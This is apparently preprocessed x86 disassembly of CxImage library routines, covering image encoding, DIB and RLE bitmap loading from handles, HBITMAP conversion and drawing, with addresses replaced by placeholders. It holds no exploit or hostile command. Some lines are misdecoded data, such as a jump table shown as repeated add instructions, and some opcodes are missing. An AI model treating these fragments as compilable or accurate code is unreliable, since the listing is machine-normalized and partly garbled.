mov [ ebp - 0x68c ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x684 ]
call ??1CxImageJPG@@UAE@XZ
mov al [ ebp - 0x68c ]
jmp r-xdata
mov [ ebp - 0x688 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x684 ]
call ??1CxImageJPG@@UAE@XZ
mov al [ ebp - 0x688 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x6cc
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
?Encode@CxImage@@QAE_NPAU_iobuf@@PAPAV1@HK@Z
push ebp
mov ebp esp
push 0xffffffff
push sub_434cb9
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x60 ]
mov ecx 0x15
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
call ??0CxIOFile@@QAE@PAU_iobuf@@@Z
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
mov ecx [ ebp - 0x10 ]
call ?Encode@CxImage@@QAE_NPAVCxFile@@PAPAV1@HK@Z
mov [ ebp - 0x20 ] al
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1c ]
call ??1CxIOFile@@UAE@XZ
mov al [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0x60
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
?Encode@CxImage@@QAE_NPAVCxFile@@PAPAV1@HK@Z
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
push r--data
mov eax [ ebp - 0x4 ]
add eax 0x44
push eax
call strcpy
add esp 0x8
xor al al
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x10
?CreateFromHANDLE@CxImage@@QAE_NPAX@Z
push ebp
mov ebp esp
sub esp 0x138
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x138 ]
mov ecx 0x4e
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call ?Destroy@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
jne r-xdata
mov esi esp
mov eax [ ebp + 0x8 ]
push eax
call [ GlobalSize@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
mov esi esp
mov ecx [ ebp + 0x8 ]
push ecx
call [ GlobalLock@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor al al
jmp r-xdata
pop edi
pop esi
pop ebx
add esp 0x138
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
xor al al
push 0x28
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x8
push ecx
call memcpy
add esp 0xc
push 0x0
mov edx [ ebp - 0x4 ]
xor eax eax
mov ax [ edx + 0x16 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov esi esp
mov edx [ ebp - 0xc ]
push edx
call [ GlobalUnlock@IAT ]
cmp esi esp
call _chkesp
xor al al
jmp r-xdata
push 0x60
mov ecx [ ebp - 0x4 ]
call ?SetXDPI@CxImage@@QAEXJ@Z
mov ecx [ ebp - 0x4 ]
fild [ ecx + 0x20 ]
fmul [ r--data ]
fdiv [ r--data ]
fadd [ r--data ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
push eax
mov ecx [ ebp - 0x4 ]
call ?SetXDPI@CxImage@@QAEXJ@Z
jmp r-xdata
push 0x60
mov ecx [ ebp - 0x4 ]
call ?SetYDPI@CxImage@@QAEXJ@Z
mov eax [ ebp - 0x4 ]
fild [ eax + 0x24 ]
fmul [ r--data ]
fdiv [ r--data ]
fadd [ r--data ]
mov esi esp
sub esp 0x8
fstp [ esp ]
call [ floor@IAT ]
add esp 0x8
cmp esi esp
call _chkesp
call _ftol
push eax
mov ecx [ ebp - 0x4 ]
call ?SetYDPI@CxImage@@QAEXJ@Z
jmp r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x24 ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp [ ecx + 0x8 ] 0xc
sete dl
mov [ ebp - 0x14 ] dl
mov ecx [ ebp - 0x4 ]
call ?GetPalette@CxImage@@QBEPAUtagRGBQUAD@@XZ
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov esi [ ebp - 0x10 ]
add esi [ eax ]
mov ecx [ ebp - 0x4 ]
call ?GetNumColors@CxImage@@QBEKXZ
shl eax 0x2
and eax 0xffff
add esi eax
mov [ ebp - 0x34 ] esi
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + 0xe ]
mov [ ebp - 0xe8 ] edx
mov eax [ ebp - 0xe8 ]
sub eax 0x1
mov [ ebp - 0xe8 ] eax
cmp [ ebp - 0xe8 ] 0x1f
ja r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + 0xe ]
cmp edx 0x20
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x20 ]
mov [ ebp - 0xe4 ] ecx
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dx [ ecx + 0xe ]
cmp edx 0x8
jg r-xdata
jmp r-xdata
mov edx [ ebp - 0xe8 ]
xor ecx ecx
mov cl [ edx + lookup_table_40fbdf ]
jmp [ ecx * 4 + jump_table_40fbcf ]
mov ecx [ ebp - 0x4 ]
call ?GetSize@CxImage@@QAEJXZ
push eax
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push ecx
call memcpy
add esp 0xc
mov eax [ ebp - 0xc ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x1c ]
sub ecx 0x1
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x1c ]
sub edx 0x1
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cx [ eax + 0xe ]
mov edx 0x1
shl edx cl
mov [ ebp - 0xe4 ] edx
jmp r-xdata
mov esi esp
mov edx [ ebp - 0xc ]
push edx
call [ GlobalUnlock@IAT ]
cmp esi esp
call _chkesp
mov al 0x1
jmp r-xdata
cmp [ ebp - 0x30 ] 0x3
je r-xdata
mov [ ebp - 0x44 ] 0x0
cmp [ ebp - 0x30 ] 0x3
jne r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0xec ] ecx
cmp [ ebp - 0xec ] 0x1
je r-xdata
cmp [ ebp - 0x2c ] 0x0
jl r-xdata
cmp [ ebp - 0x24 ] 0x0
jl r-xdata
mov edx [ ebp - 0xe4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x14 ]
and eax 0xff
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
add ecx [ eax ]
push ecx
lea edx [ ebp - 0x40 ]
push edx
call memcpy
add esp 0xc
mov eax [ ebp - 0x10 ]
mov cl [ eax + 0xe ]
push ecx
mov dx [ ebp - 0x38 ]
push edx
mov ax [ ebp - 0x3c ]
push eax
mov cx [ ebp - 0x40 ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
lea edx [ ecx + eax + 0xc ]
push edx
mov ecx [ ebp - 0x4 ]
call ?Bitfield2RGB@CxImage@@IAEXPAEGGGE@Z
jmp r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x7c00
mov [ ebp - 0x4c ] 0x3e0
mov [ ebp - 0x48 ] 0x1f
push 0xc
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
add edx [ ecx ]
push edx
lea eax [ ebp - 0x50 ]
push eax
call memcpy
add esp 0xc
mov [ ebp - 0x44 ] 0xc
jmp r-xdata
mov [ ebp - 0x9c ] 0x0
mov [ ebp - 0xa0 ] 0x0
mov [ ebp - 0xa4 ] 0x0
mov [ ebp - 0xa8 ] 0x0
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0xc0 ]
call sub_40fc00
mov [ ebp - 0xc4 ] 0x1
cmp [ ebp - 0xec ] 0x2
je r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov esi [ ebp - 0x28 ]
mov dl [ esi + edx * 4 + 0x2a ]
mov [ ecx + eax * 4 + 0x2 ] dl
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov esi [ ebp - 0x28 ]
mov dl [ esi + edx * 4 + 0x29 ]
mov [ ecx + eax * 4 + 0x1 ] dl
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov esi [ ebp - 0x28 ]
mov dl [ esi + edx * 4 + 0x28 ]
mov [ ecx + eax * 4 ] dl
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + eax * 4 + 0x3 ] 0x0
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x3
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov cl [ esi + ecx + 0xe ]
mov [ eax + edx * 4 + 0x2 ] cl
mov edx [ ebp - 0x24 ]
imul edx edx 0x3
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov dl [ esi + edx + 0xd ]
mov [ ecx + eax * 4 + 0x1 ] dl
mov eax [ ebp - 0x24 ]
imul eax eax 0x3
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov al [ esi + eax + 0xc ]
mov [ edx + ecx * 4 ] al
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
mov [ edx + ecx * 4 + 0x3 ] 0x0
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xdc ] r--data
push r--data
lea eax [ ebp - 0xdc ]
push eax
call _CxxThrowException
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
add eax 0x1
cdq
sub eax edx
sar eax 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
imul ecx eax
shl ecx 0x2
push ecx
mov edx [ ebp - 0x34 ]
add edx [ ebp - 0x44 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
push ecx
call memcpy
add esp 0xc
push 0x10
mov dx [ ebp - 0x48 ]
push edx
mov ax [ ebp - 0x4c ]
push eax
mov cx [ ebp - 0x50 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
push eax
mov ecx [ ebp - 0x4 ]
call ?Bitfield2RGB@CxImage@@IAEXPAEGGGE@Z
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov dl [ ecx ]
mov [ ebp - 0x9c ] dl
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x9c ]
and ecx 0xff
test ecx ecx
jne r-xdata
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x5c ] 0x0
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x64 ] 0x0
mov edx [ ebp - 0x4 ]
push edx
lea ecx [ ebp - 0x7c ]
call sub_40fc00
mov [ ebp - 0x80 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x2c ]
sub edx 0x1
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x24 ]
sub eax 0x1
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0xa4 ]
push ecx
lea ecx [ ebp - 0xc0 ]
call sub_40fc80
mov [ ebp - 0xd4 ] eax
mov edx [ ebp - 0x34 ]
mov al [ edx ]
mov [ ebp - 0xa0 ] al
mov ecx [ ebp - 0x34 ]
add ecx 0x1
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0xd8 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov al [ edx ]
mov [ ebp - 0x9c ] al
mov ecx [ ebp - 0x34 ]
add ecx 0x1
mov [ ebp - 0x34 ] ecx
mov dl [ ebp - 0x9c ]
mov [ ebp - 0xf8 ] dl
cmp [ ebp - 0xf8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov cl [ eax ]
mov [ ebp - 0x54 ] cl
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov al [ ebp - 0x54 ]
mov [ ebp - 0xf0 ] al
cmp [ ebp - 0xf0 ] 0x0
je r-xdata
mov [ ebp - 0xe0 ] r--data
push r--data
lea ecx [ ebp - 0xe0 ]
push ecx
call _CxxThrowException
mov eax [ ebp - 0x9c ]
and eax 0xff
cmp [ ebp - 0xd8 ] eax
jae r-xdata
mov [ ebp - 0xa8 ] 0x0
mov eax [ ebp - 0xa4 ]
add eax 0x1
mov [ ebp - 0xa4 ] eax
jmp r-xdata
cmp [ ebp - 0xf8 ] 0x1
je r-xdata
mov ecx [ ebp - 0x34 ]
mov dl [ ecx ]
mov [ ebp - 0x54 ] dl
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
mov cl [ ebp - 0x54 ]
mov [ ebp - 0xf4 ] cl
cmp [ ebp - 0xf4 ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0xd4 ]
add ecx [ ebp - 0xa8 ]
mov dl [ ebp - 0xa0 ]
mov [ ecx ] dl
mov eax [ ebp - 0xa8 ]
add eax 0x1
mov [ ebp - 0xa8 ] eax
jmp r-xdata
jmp r-xdata
mov [ ebp - 0xc4 ] 0x0
jmp r-xdata
cmp [ ebp - 0xf8 ] 0x2
je r-xdata
mov [ ebp - 0x60 ] 0x0
mov edx [ ebp - 0x5c ]
add edx 0x1
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x64 ] 0x0
jmp r-xdata
cmp [ ebp - 0xf4 ] 0x1
je r-xdata
mov eax [ ebp - 0x5c ]
push eax
lea ecx [ ebp - 0x7c ]
call sub_40fc80
mov [ ebp - 0x94 ] eax
mov ecx [ ebp - 0x34 ]
mov dl [ ecx ]
mov [ ebp - 0x58 ] dl
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x98 ] 0x0
jmp r-xdata
cmp [ ebp - 0xc4 ] 0x0
je r-xdata
mov edx [ ebp - 0xd8 ]
add edx 0x1
mov [ ebp - 0xd8 ] edx
mov ecx [ ebp - 0x34 ]
mov dl [ ecx ]
mov [ ebp - 0xc8 ] dl
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x34 ]
mov dl [ ecx ]
mov [ ebp - 0xcc ] dl
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0xc8 ]
and ecx 0xff
mov edx [ ebp - 0xa8 ]
add edx ecx
mov [ ebp - 0xa8 ] edx
mov eax [ ebp - 0xcc ]
and eax 0xff
mov ecx [ ebp - 0xa4 ]
add ecx eax
mov [ ebp - 0xa4 ] ecx
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x80 ] 0x0
jmp r-xdata
cmp [ ebp - 0xf4 ] 0x2
je r-xdata
mov edx [ ebp - 0x54 ]
and edx 0xff
cmp [ ebp - 0x98 ] edx
jae r-xdata
mov edx [ ebp - 0x9c ]
and edx 0xff
mov [ ebp - 0xd0 ] edx
mov eax [ ebp - 0xd0 ]
push eax
mov ecx [ ebp - 0x34 ]
push ecx
mov edx [ ebp - 0xa4 ]
push edx
lea ecx [ ebp - 0xc0 ]
call sub_40fc80
add eax [ ebp - 0xa8 ]
push eax
call memcpy
add esp 0xc
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0xd0 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x9c ]
and ecx 0xff
and ecx 0x1
cmp ecx 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov cl [ eax ]
mov [ ebp - 0x84 ] cl
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x34 ]
mov cl [ eax ]
mov [ ebp - 0x88 ] cl
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x84 ]
and eax 0xff
cdq
sub eax edx
sar eax 0x1
mov ecx [ ebp - 0x60 ]
add ecx eax
mov [ ebp - 0x60 ] ecx
mov edx [ ebp - 0x88 ]
and edx 0xff
mov eax [ ebp - 0x5c ]
add eax edx
mov [ ebp - 0x5c ] eax
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov edx [ ebp - 0x9c ]
and edx 0xff
mov eax [ ebp - 0xa8 ]
add eax edx
mov [ ebp - 0xa8 ] eax
mov edx [ ebp - 0x34 ]
mov al [ edx ]
mov [ ebp - 0xa0 ] al
mov ecx [ ebp - 0x34 ]
add ecx 0x1
mov [ ebp - 0x34 ] ecx
cmp [ ebp - 0x80 ] 0x0
je r-xdata
mov ecx [ ebp - 0x34 ]
mov dl [ ecx ]
mov [ ebp - 0x58 ] dl
mov eax [ ebp - 0x34 ]
add eax 0x1
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x5c ]
push ecx
lea ecx [ ebp - 0x7c ]
call sub_40fc80
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x90 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x94 ]
add ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x1c ]
cmp ecx eax
jae r-xdata
mov eax [ ebp - 0x94 ]
add eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x1c ]
cmp eax edx
jae r-xdata
mov eax [ ebp - 0x54 ]
and eax 0xff
cmp [ ebp - 0x90 ] eax
jge r-xdata
xor edx edx
cmp [ ebp - 0x64 ] 0x0
sete dl
mov [ ebp - 0x64 ] edx
jmp r-xdata
mov eax [ ebp - 0x58 ]
and eax 0xff
and eax 0xf0
mov ecx [ ebp - 0x94 ]
add ecx [ ebp - 0x60 ]
mov [ ecx ] al
mov eax [ ebp - 0x60 ]
add eax 0x1
mov [ ebp - 0x60 ] eax
jmp r-xdata
mov edx [ ebp - 0x58 ]
and edx 0xff
and edx 0xf
mov eax [ ebp - 0x94 ]
add eax [ ebp - 0x60 ]
mov cl [ eax ]
or cl dl
mov edx [ ebp - 0x94 ]
add edx [ ebp - 0x60 ]
mov [ edx ] cl
mov edx [ ebp - 0x54 ]
and edx 0xff
add edx 0x1
sar edx 0x1
and edx 0x1
cmp edx 0x1
jne r-xdata
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov ecx [ ebp - 0x98 ]
add ecx 0x1
mov [ ebp - 0x98 ] ecx
mov eax [ ebp - 0x34 ]
mov cl [ eax ]
mov [ ebp - 0x58 ] cl
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
mov eax [ ebp - 0x8c ]
add eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x1c ]
cmp eax edx
jae r-xdata
mov ecx [ ebp - 0x8c ]
add ecx [ ebp - 0x60 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x34 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x1c ]
cmp ecx eax
jae r-xdata
xor ecx ecx
cmp [ ebp - 0x64 ] 0x0
sete cl
mov [ ebp - 0x64 ] ecx
jmp r-xdata
mov edx [ ebp - 0x58 ]
and edx 0xff
and edx 0xf0
mov eax [ ebp - 0x8c ]
add eax [ ebp - 0x60 ]
mov [ eax ] dl
mov ecx [ ebp - 0x54 ]
and ecx 0xff
sub ecx 0x1
cmp [ ebp - 0x90 ] ecx
je r-xdata
mov eax [ ebp - 0x58 ]
and eax 0xff
and eax 0xf
mov ecx [ ebp - 0x8c ]
add ecx [ ebp - 0x60 ]
mov dl [ ecx ]
or dl al
mov eax [ ebp - 0x8c ]
add eax [ ebp - 0x60 ]
mov [ eax ] dl
mov edx [ ebp - 0x90 ]
add edx 0x1
mov [ ebp - 0x90 ] edx
mov edx [ ebp - 0x60 ]
add edx 0x1
mov [ ebp - 0x60 ] edx
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov al [ edx ]
mov [ ebp - 0x58 ] al
mov ecx [ ebp - 0x34 ]
add ecx 0x1
mov [ ebp - 0x34 ] ecx
sub_40fbe3
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_40fc00
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] 0x0
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] 0x0
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
call ?GetBits@CxImage@@QAEPAEK@Z
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] eax
sub_40fc80
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40fcd0
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
sub_40fcd0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x44 ]
mov ecx 0x11
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0x8 ] 0x0
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
call ?GetHeight@CxImage@@QBEKXZ
cmp [ ebp + 0x8 ] eax
jle r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] edx
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
call ?GetBits@CxImage@@QAEPAEK@Z
mov esi eax
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0x14 ]
call ?GetEffWidth@CxImage@@QBEKXZ
imul eax [ ebp + 0x8 ]
add esi eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] esi
?CreateFromHBITMAP@CxImage@@QAE_NPAUHBITMAP__@@PAUHPALETTE__@@@Z
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x60 ]
mov ecx 0x18
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call ?Destroy@CxImage@@QAE_NXZ
and eax 0xff
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
xor al al
mov esi esp
lea eax [ ebp - 0x1c ]
push eax
push 0x18
mov ecx [ ebp + 0x8 ]
push ecx
call [ GetObjectA@IAT ]
cmp esi esp
call _chkesp
push 0x0
mov edx [ ebp - 0xa ]
and edx 0xffff
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x18 ]
push ecx
mov ecx [ ebp - 0x4 ]
call ?Create@CxImage@@QAEPAXKKKK@Z
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
add esp 0x60
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x8
mov esi esp
push 0x0
call [ GetDC@IAT ]
cmp esi esp
call _chkesp
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor al al
jmp r-xdata
mov esi esp
push 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
push 0x0
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x20 ]
push eax
call [ GetDIBits@IAT ]
cmp esi esp
call _chkesp
test eax eax
jne r-xdata
mov esi esp
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x20 ]
push eax
call [ SelectObject@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov ecx [ ebp - 0x20 ]
push ecx
call [ RealizePalette@IAT ]
cmp esi esp
call _chkesp
mov esi esp
mov eax [ ebp - 0x20 ]
push eax
push 0x0
call [ ReleaseDC@IAT ]
cmp esi esp
call _chkesp
mov al 0x1
jmp r-xdata
push r--data
mov ecx [ ebp - 0x4 ]
add ecx 0x44
push ecx
call strcpy
add esp 0x8
mov esi esp
mov edx [ ebp - 0x20 ]
push edx
push 0x0
call [ ReleaseDC@IAT ]
cmp esi esp
call _chkesp
xor al al
jmp r-xdata
?Draw@CxImage@@QAEJPAUHDC__@@JJJJPAUtagRECT@@@Z
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
push ecx
lea edi [ ebp - 0x248 ]
mov ecx 0x92
mov eax 0xcccccccc
[ edi ]
pop ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x248
cmp ebp esp
call _chkesp
mov esp ebp
pop ebp
retn 0x18
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov dl [ ecx + 0x17e ]
test edx edx
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
jge r-xdata
cmp [ ebp + 0x18 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0xc ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x4 ]
xor edx edx
cmp [ ecx + 0x14c ] 0xffffffff
setne dl
mov [ ebp - 0x8 ] dl
mov eax [ ebp - 0x4 ]
xor ecx ecx
cmp [ eax + 0x1a0 ] 0x0
setne cl
mov [ ebp - 0xc ] cl
cmp [ ebp + 0x1c ] 0x0
je r-xdata
